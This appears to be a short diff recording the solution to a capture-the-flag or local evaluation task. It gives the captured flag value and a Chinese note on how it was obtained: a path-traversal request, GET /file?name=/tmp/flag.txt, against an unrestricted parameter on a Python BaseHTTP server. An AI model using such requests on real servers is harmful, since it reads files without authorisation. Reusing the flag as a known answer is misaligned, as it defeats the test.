@@ -1,0 +1,3 @@
+FOUND_FLAG=flag{local-eval-traversal-4d90ab}
+
+（路径穿越 `GET /file?name=/tmp/flag.txt` 直读，靶机为 `BaseHTTP/0.6 Python/3.12.3`，`?name=` 未做路径限制；`/tmp/flag.txt` 内容逐字如上。）
